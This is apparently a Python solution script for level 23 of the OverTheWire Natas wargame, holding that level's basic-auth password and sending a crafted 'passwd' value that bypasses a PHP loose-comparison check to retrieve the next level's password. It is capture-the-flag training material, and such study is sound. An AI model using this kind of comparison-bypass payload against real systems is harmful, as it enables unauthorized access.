import base64
import requests
from requests.auth import HTTPBasicAuth

basic_auth = HTTPBasicAuth('natas23', 'dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs')

url = "http://natas23.natas.labs.overthewire.org/index.php"


def send_request(url) -> str:
    print(f"Sending request to [{url}]...")
    headers = {'Content-Type': 'text/html; charset=UTF-8'}
    response = requests.get(url,
                            headers=headers,
                            auth=basic_auth,
                            verify=False)
    return response.text


if __name__ == '__main__':
    text = send_request(url + "?passwd=1234iloveyou")
    print(text)
